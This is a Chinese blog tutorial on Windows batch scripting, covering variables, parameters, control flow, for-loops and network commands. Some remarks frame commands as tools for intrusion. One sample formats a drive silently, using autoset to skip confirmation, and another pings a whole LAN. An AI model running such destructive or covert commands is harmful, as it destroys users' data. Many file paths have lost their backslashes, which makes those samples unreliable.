<p>
	&nbsp;</p>
<div class="article_title">
	<h1>
		<span class="link_title"><a href="http://blog.csdn.net/junmuzi/article/details/12239303"> windows bat脚本编写 </a></span></h1>
	<p>
		&nbsp;</p>
	<p align="left">
		基础部分:<br />
		======================================================================<br />
		<br />
		一、基础语法：<br />
		&nbsp;&nbsp;&nbsp; 1.批处理文件是一个&ldquo;.bat&rdquo;结尾的文本文件，这个文件的每一行都是一条DOS命令。可以使用任何文本文件编辑工具创建和修改。<br />
		&nbsp;&nbsp;&nbsp; 2.批处理是一种简单的程序，可以用 if 和 goto 来控制流程，也可以使用 for 循环。<br />
		&nbsp;&nbsp;&nbsp; 3.批处理的编程能力远不如C语言等编程语言，也十分不规范。<br />
		&nbsp;&nbsp;&nbsp; 4.每个编写好的批处理文件都相当于一个DOS的外部命令，把它所在的目录放到DOS搜索路径(path)中，即可在任意位置运行。<br />
		&nbsp;&nbsp;&nbsp; 5.C:AUTOEXEC.BAT 是每次系统启动时都会自动运行的，可以将每次启动时都要运行的命令放入该文件中。<br />
		&nbsp;&nbsp;&nbsp; 6.大小写不敏感(命令符忽略大小写)<br />
		&nbsp;&nbsp;&nbsp; 7.批处理的文件扩展名为 .bat 或 .cmd。<br />
		&nbsp;&nbsp;&nbsp; 8.在命令提示下键入批处理文件的名称，或者双击该批处理文件，系统就会调用Cmd.exe来运行该文件。<br />
		<br />
		<br />
		二、参数：<br />
		&nbsp;&nbsp;&nbsp; 1) 系统参数</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %SystemRoot%&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; C:WINDOWS&nbsp;&nbsp;&nbsp; (%windir% 同样)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %ProgramFiles% ===&nbsp;&nbsp;&nbsp; C:Program Files<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %USERPROFILE%&nbsp; ===&nbsp;&nbsp;&nbsp; C:Documents and SettingsAdministrator&nbsp; (子目录有&ldquo;桌面&rdquo;,&ldquo;开始菜单&rdquo;,&ldquo;收藏夹&rdquo;等)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %APPDATA%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; C:Documents and SettingsAdministratorApplication Data<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %TEMP%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; C:DOCUME~1ADMINI~1LOCALS~1Temp&nbsp; (%TEM% 同样)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %APPDATA%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; C:Documents and SettingsAdministratorApplication Data<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %OS%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; Windows_NT (系统)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %Path%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; %SystemRoot%system32;%SystemRoot%;%SystemRoot%System32Wbem&nbsp; (原本的设置)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %HOMEDRIVE%&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; C:&nbsp;&nbsp; (系统盘)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %HOMEPATH%&nbsp;&nbsp;&nbsp;&nbsp; ===&nbsp;&nbsp;&nbsp; Documents and SettingsAdministrator<br />
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 枚举当前的环境变量<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setlocal enabledelayedexpansion<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FOR /F &quot;usebackq delims==&quot; %%i IN (`set`) DO @echo %%i&nbsp;&nbsp;&nbsp; !%%i!</p>
	<p align="left">
		<br />
		<br />
		&nbsp;&nbsp;&nbsp; 2) 传递参数给批处理文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %[1-9]表示参数，参数是指在运行批处理文件时在文件名后加的以空格(或者Tab)分隔的字符串。<br />
		变量可以从%0到%9，%0表示批处理命令本身，其它参数字符串用 %1 到 %9 顺序表示。</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sample：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call test2.bat &quot;hello&quot; &quot;haha&quot; (执行同目录下的&ldquo;test2.bat&rdquo;文件，并输入两个参数)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在&ldquo;test2.bat&rdquo;文件里写:<br />
		&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo %1&nbsp; (打印: &quot;hello&quot;)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo %2&nbsp; (打印: &quot;haha&quot;)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo %0&nbsp; (打印: test2.bat)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo %19 (打印: &quot;hello&quot;9)</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		三、批处理基本命令</p>
	<p align="left">
		0. help 命令<br />
		&nbsp; /? 命令<br />
		&nbsp; 语法： 命令 /?<br />
		&nbsp; 可显示此命令的帮助信息</p>
	<p align="left">
		&nbsp; Sample： type /? &gt;&gt;tmp.txt&nbsp; (把 type 命令的帮助信息写入到tmp.txt文件里)<br />
		&nbsp; Sample： help type&nbsp; (显示跟&ldquo;type /?&rdquo;一样)</p>
	<p align="left">
		<br />
		<br />
		<br />
		1.Echo 命令<br />
		&nbsp; 语法: echo [{on|off}] [message]<br />
		&nbsp; ECHO [ON | OFF]&nbsp;&nbsp; 打开回显或关闭回显功能。<br />
		&nbsp; ECHO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示当前回显设置。<br />
		&nbsp; ECHO [message]&nbsp;&nbsp;&nbsp; 显示信息。<br />
		&nbsp; echo off 表示在此语句后所有运行的命令都不显示命令行本身；默认是on，on时会显示如： C:文件夹路径&gt;命令行。<br />
		&nbsp; 在实际应用中我们会把这条命令和重定向符号( 也称为管道符号，一般用 &gt; &gt;&gt; ^ )结合来实现输入一些命令到特定格式的文件中。</p>
	<p align="left">
		&nbsp; Sample： echo off<br />
		&nbsp; Sample： echo hello world&nbsp; (显示出&ldquo;hello world&rdquo;)<br />
		&nbsp; Sample： echo Windows Registry Editor Version 5.00 &gt; c:setupreg.reg (此前还没有 setupreg.reg 这个文件)<br />
		&nbsp; Sample： echo &quot;SourcePath&quot;=&quot;D:Win2003&quot; &gt;&gt; c:setupreg.reg&nbsp;&nbsp; (追加内容进 setupreg.reg 这个文件)</p>
	<p align="left">
		<br />
		2.@ 命令<br />
		&nbsp; 表示不显示@后面的命令，(在入侵过程中自然不能让对方看到你使用的命令啦)<br />
		&nbsp; @ 与 echo off 相象，但它是加在每个命令行的最前面，表示运行时不显示这一行的命令行(只能影响当前行)。</p>
	<p align="left">
		&nbsp; Sample： @echo off&nbsp; (此语句常用于开头，表示不显示所有的命令行信息，包括此句)<br />
		&nbsp; Sample： @echo please wait a minite...<br />
		&nbsp; Sample： @format X: /q/u/autoset</p>
	<p align="left">
		&nbsp; (format 这个命令是不可以使用/y这个参数的，可喜的是微软留了个autoset这个参数给我们，效果和/y是一样的。)<br />
		<br />
		3.Goto 命令<br />
		&nbsp; 语法：goto label (label是参数，指定所要转向的批处理程序中的行。)<br />
		&nbsp; 指定跳转到标签行，找到标签行后，程序将处理从下一行开始的命令。<br />
		&nbsp; label标签的名字可以随便起，但是最好是有意义的，字母前必须加个冒号&ldquo;:&rdquo;来表示这个字母是标签。<br />
		&nbsp; goto命令就是根据这个冒号来寻找下一步跳到到那里。经常与 if 配合使用，根据不同的条件来执行不同的命令组。<br />
		&nbsp; 例题见&ldquo;5.Pause 命令&rdquo;<br />
		<br />
		4.Rem 命令<br />
		&nbsp; 语法：Rem Message...<br />
		&nbsp; (小技巧：用::代替rem)<br />
		&nbsp; 注释命令，在C语言中相当与/*...*/,它并不会被执行，只是起一个注释的作用，便于别人阅读和自己日后修改。</p>
	<p align="left">
		&nbsp; Sample：@Rem Here is the description.</p>
	<p align="left">
		<br />
		5.Pause 命令<br />
		&nbsp; 会暂停批处理的执行并在屏幕上显示Press any key to continue...的提示，等待用户按任意键后继续</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		&nbsp; Sample：<br />
		&nbsp;&nbsp; @echo off<br />
		&nbsp;&nbsp; :begin<br />
		&nbsp;&nbsp; copy a:*.* d:ack<br />
		&nbsp;&nbsp; echo Please put a new disk into driver A<br />
		&nbsp;&nbsp; pause<br />
		&nbsp;&nbsp; goto begin</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		&nbsp; 在这个例子中，驱动器 A 中磁盘上的所有文件均复制到d:ack中。<br />
		&nbsp; 显示的信息提示您将另一张磁盘放入驱动器 A 时，pause 命令会使程序挂起，以便您更换磁盘，然后按任意键再次复制。<br />
		<br />
		6.Call 命令<br />
		&nbsp; 语法: call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]<br />
		&nbsp; 参数: [Drive:][Path] FileName&nbsp; 指定要调用的批处理程序的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。<br />
		&nbsp; 调用另一个批处理程序，并且不终止父批处理程序。<br />
		&nbsp; 如果不用call而直接调用别的批处理文件，那么执行完那个批处理文件后将无法返回当前文件并执行当前文件的后续命令。<br />
		&nbsp; call 命令接受用作调用目标的标签。如果在脚本或批处理文件外使用 Call，它将不会在命令行起作用。</p>
	<p align="left">
		&nbsp; Sample：call=&quot;%cd% est2.bat&quot; haha kkk aaa&nbsp;&nbsp;&nbsp; (调用指定目录下的 test2.bat，且输入3个参数给他)<br />
		&nbsp; Sample：call test2.bat arg1 arg2&nbsp;&nbsp;&nbsp; (调用同目录下的 test2.bat，且输入2个参数给他)</p>
	<p align="left">
		&nbsp; 注：可以调用自身(死循环、递归)<br />
		<br />
		7.start 命令<br />
		&nbsp; 调用外部程序，所有的 DOS命令 和 命令行程序 都可以由 start命令 来调用。<br />
		&nbsp; 入侵常用参数：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MIN 开始时窗口最小化<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SEPARATE 在分开的空间内开始 16 位 Windows 程序<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HIGH 在 HIGH 优先级类别开始应用程序<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; REALTIME 在 REALTIME 优先级类别开始应用程序<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WAIT 启动应用程序并等候它结束<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parameters 这些为传送到命令/程序的参数</p>
	<p align="left">
		&nbsp; Sample：start /MIN test2.bat arg1 arg2&nbsp;&nbsp;&nbsp; (调用同目录下的 test2.bat，且输入2个参数给他，且本窗口最小化)<br />
		&nbsp; Sample：e:&quot;program files&quot;极品列车时刻表jpskb.exe&nbsp; (文件路径名有空格时)</p>
	<p align="left">
		<br />
		8.If 命令<br />
		&nbsp; if 表示将判断是否符合规定的条件，从而决定执行不同的命令。有三种格式:<br />
		&nbsp; 1) IF<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 语法: if [not] &quot;参数&quot; == &quot;字符串&quot; 待执行的命令<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 参数如果等于(not表示不等，下同)指定的字符串，则条件成立，运行命令，否则运行下一句。(注意是两个等号)</p>
	<p align="left">
		&nbsp;&nbsp; Sample: if &quot;%1&quot; == &quot;a&quot; format a:<br />
		&nbsp;&nbsp; Sample: if {%1} == {} goto noparms</p>
	<p align="left">
		<br />
		&nbsp; 2) if exist<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 语法: if [not] exist [路径]文件名 待执行的命令<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 如果有指定的文件，则条件成立，运行命令，否则运行下一句。</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp; Sample: if exist config.sys edit config.sys&nbsp;&nbsp; (表示如果存在这文件，则编辑它，用很难看的系统编辑器)<br />
		&nbsp;&nbsp;&nbsp;&nbsp; Sample: if exist config.sys type config.sys&nbsp;&nbsp; (表示如果存在这文件，则显示它的内容)</p>
	<p align="left">
		<br />
		&nbsp; 3) if errorlevel number<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 语法: if [not] errorlevel &lt;数字&gt; 待执行的命令<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 如果程序返回值等于指定的数字，则条件成立，运行命令，否则运行下一句。(返回值必须按照从大到小的顺序排列)</p>
	<p align="left">
		&nbsp; &nbsp;&nbsp;&nbsp;Sample:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @echo off<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XCOPY F: est.bat D:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 1 (ECHO 文件拷贝失败<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ) Else IF ERRORLEVEL 0 ECHO 成功拷贝文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pause</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 很多DOS程序在运行结束后会返回一个数字值用来表示程序运行的结果(或者状态)，称为错误码errorlevel或称返回码。<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 常见的返回码为0、1。通过if errorlevel命令可以判断程序的返回值，根据不同的返回值来决定执行不同的命令。<br />
		&nbsp; 4) else<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 语法： if 条件 (成立时执行的命令) else (不成立时执行的命令)<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 如果是多个条件，建议适当使用括号把各条件包起来，以免出错。</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp; Sample: if 1 == 0 ( echo comment1 ) else if 1==0 ( echo comment2 ) else (echo comment3 )<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 注：如果 else 的语句需要换行，if 执行的行尾需用&ldquo;^&rdquo;连接，并且 if 执行的动作需用(括起来)，否则报错<br />
		&nbsp;&nbsp;&nbsp;&nbsp; Sample: if 1 == 0 ( echo comment1 ) else if 1==0 ( echo comment2 ) ^<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else (echo comment3 )</p>
	<p align="left">
		<br />
		&nbsp; 5) 比较运算符:<br />
		&nbsp;&nbsp;&nbsp;&nbsp; EQU - 等于&nbsp;&nbsp; (一般使用&ldquo;==&rdquo;)<br />
		&nbsp;&nbsp;&nbsp;&nbsp; NEQ - 不等于 (没有 &ldquo;!=&rdquo;,改用&ldquo; if not 1==1 &rdquo;的写法)<br />
		&nbsp;&nbsp;&nbsp;&nbsp; LSS - 小于<br />
		&nbsp;&nbsp;&nbsp;&nbsp; LEQ - 小于或等于<br />
		&nbsp;&nbsp;&nbsp;&nbsp; GTR - 大于<br />
		&nbsp;&nbsp;&nbsp; &nbsp;GEQ - 大于或等于<br />
		<br />
		<br />
		9.choice 命令<br />
		&nbsp; choice 使用此命令可以让用户输入一个字符(用于选择)，从而根据用户的选择返回不同的 errorlevel，<br />
		&nbsp; 然后配合 if errorlevel 选择运行不同的命令。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意：choice命令为DOS或者Windows系统提供的外部命令，不同版本的choice命令语法会稍有不同，请用choice /?查看用法。<br />
		&nbsp; choice 使用此命令可以让用户输入一个字符，从而运行不同的命令。<br />
		&nbsp; 使用时应该加/c:参数，c:后应写提示可输入的字符，之间无空格。它的返回码为1234&hellip;&hellip;</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp; Sample:&nbsp; choice /c:dme defrag,mem,end<br />
		&nbsp;&nbsp;&nbsp; 将显示:&nbsp; defrag,mem,end[D,M,E]?<br />
		&nbsp;&nbsp;&nbsp; Sample:<br />
		&nbsp;&nbsp;&nbsp; choice /c:dme defrag,mem,end<br />
		&nbsp;&nbsp;&nbsp; if errorlevel 3 goto defrag (应先判断数值最高的错误码)<br />
		&nbsp;&nbsp;&nbsp; if errorlevel 2 goto mem<br />
		&nbsp;&nbsp;&nbsp; if errotlevel 1 goto end</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		<br />
		<br />
		10.for 命令<br />
		&nbsp;&nbsp; for 命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。<br />
		&nbsp;&nbsp; 1) for {%variable | %%variable} in (set) do command [command-parameters]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %variable 指定一个单一字母可替换的参数。变量名称是区分大小写的，所以 %i 不同于 %I<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在批处理文件中使用 FOR 命令时，指定变量建议用 %%variable而不要用 %variable。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (set) 指定一个或一组文件。可以使用通配符。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command 指定对每个文件执行的命令。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command-parameters 为特定命令指定参数或命令行开关。<br />
		&nbsp;&nbsp; 2) 如果命令扩展名被启用，下列额外的 FOR 命令格式会受到支持:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a.FOR /D %variable IN (set) DO command [command-parameters]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果集里面包含通配符，则指定与目录名匹配，而不与文件名匹配。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b.FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检查以 [drive:]path 为根的目录树，指向每个目录中的FOR 语句。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果在 /R 后没有指定目录，则使用当前目录。如果集仅为一个单点(.)字符，则枚举该目录树。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c.FOR /L %variable IN (start,step,end) DO command [command-parameters]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 该集表示以增量形式从开始到结束的一个数字序列。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如：(1,1,5) 将产生序列 1 2 3 4 5；&nbsp; 而(5,-1,1) 将产生序列 (5 4 3 2 1)。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d.有或者没有 usebackq 选项:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FOR /F [&quot;options&quot;] %variable IN (file-set) DO command<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FOR /F [&quot;options&quot;] %variable IN (command)&nbsp; DO command<br />
		&nbsp;&nbsp;&nbsp; 参数&quot;options&quot;为:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eol=c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - 指一个行注释字符的结尾(就一个,如&ldquo;;&rdquo;)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; skip=n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - 指在文件开始时忽略的行数。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; delims=xxx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tokens=x,y,m-n&nbsp; - 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的分配。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m-n格式为一个范围。通过 nth 符号指定 mth。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usebackq&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - 指定新语法已在下类情况中使用:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset中使用双引号扩起文件名称。<br />
		&nbsp;&nbsp; 3) Sample:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1. 如下命令行会显示当前目录下所有以bat或者txt为扩展名的文件名。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for %%c in (*.bat *.txt) do (echo %%c)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a. 如下命令行会显示当前目录下所有包含有 e 或者 i 的目录名。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /D %%a in (*e* *i*) do echo %%a<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b. 如下命令行会显示 E盘test目录 下所有以bat或者txt为扩展名的文件名。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /R E: est %%b in (*.txt *.bat) do echo %%b<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /r %%c in (*) do (echo %%c)&nbsp; :: 遍历当前目录下所有文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c. 如下命令行将产生序列 1 2 3 4 5<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /L %%c in (1,1,5) do echo %%c<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d. 以下两句，显示当前的年月日和时间<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For /f &quot;tokens=1-3 delims=-/. &quot; %%j In (&#39;Date /T&#39;) do echo %%j年%%k月%%l日<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For /f &quot;tokens=1,2 delims=: &quot; %%j In (&#39;TIME /T&#39;) do echo %%j时%%k分<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e. 把记事本中的内容每一行前面去掉8个字符<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setlocal enabledelayedexpansion<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /f %%i in (zhidian.txt) do (<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; set atmp=%%i<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; set atmp=!atmp:~8!<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if {!atmp!}=={} ( echo.) else echo !atmp!<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 读取记事本里的内容(使用 delims 是为了把一行显示全,否则会以空格为分隔符)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /f &quot;delims=&quot; %%a in (zhidian.txt) do echo.%%a<br />
		&nbsp;&nbsp; 4) continue 和 break<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 利用 goto 实现程序中常用的 continue 和 break 命令, 其实非常简单<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue: 在 for 循环的最后一行写上一个标签，跳转到这位置即可<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break: 在 for 循环的外面的下一句写上一个标签，跳转到这位置即可<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sample: (伪代码)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /F [&quot;options&quot;] %variable IN (command)&nbsp; DO (<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ... do command ...<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ... goto continue<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ... goto break<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ... do command ...<br />
		&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:continue<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :break<br />
		<br />
		<br />
		四、其它命令<br />
		1. ping 命令<br />
		&nbsp;&nbsp; 测试网络联接状况以及信息包发送和接收状况。但是不能够测试端口。<br />
		&nbsp;&nbsp; 语法：ping IP地址或主机名 [-t] [-a] [-n count] [-l size]<br />
		&nbsp;&nbsp;&nbsp; 参数含义：<br />
		&nbsp;&nbsp;&nbsp; -t 不停地向目标主机发送数据；<br />
		&nbsp;&nbsp;&nbsp; -a 以IP地址格式来显示目标主机的网络地址；<br />
		&nbsp;&nbsp;&nbsp; -n count 指定要Ping多少次，具体次数由count来指定；<br />
		&nbsp;&nbsp;&nbsp; -l size 指定发送到目标主机的数据包的大小。</p>
	<p align="left">
		&nbsp; Sample: ping 192.168.0.1 -t (不停的测试192.168.0.1，按ctrl+c停止)<br />
		&nbsp; Sample: for /L %%a in (0,1,255) do ping 192.168.0.%%a -n 1 &gt;&gt; tmp.txt (ping一下所有的局域网电脑)</p>
	<p align="left">
		<br />
		2. telnet 命令<br />
		&nbsp;&nbsp; 测试端口使用 telnet IP地址或主机名 端口，使用tcp协议的</p>
	<p align="left">
		&nbsp;&nbsp; Sample:&nbsp; telnet 192.168.0.1 80 (测试192.168.0.1的80端口)</p>
	<p align="left">
		<br />
		3.color 命令<br />
		&nbsp;&nbsp; 设置背景及字体颜色<br />
		&nbsp;&nbsp; 语法： color bf<br />
		&nbsp;&nbsp; b 是指定背景色的十六进制数字； f 指定前景颜色(即字体颜色)。<br />
		&nbsp;&nbsp; 颜色值:&nbsp;&nbsp;&nbsp;&nbsp; 0:黑色&nbsp;&nbsp;&nbsp; 1:蓝色&nbsp;&nbsp;&nbsp; 2:绿色&nbsp;&nbsp;&nbsp; 3:湖蓝&nbsp;&nbsp;&nbsp; 4:红色&nbsp;&nbsp;&nbsp; 5:紫色&nbsp;&nbsp;&nbsp; 6:黄色&nbsp;&nbsp;&nbsp; 7:白色<br />
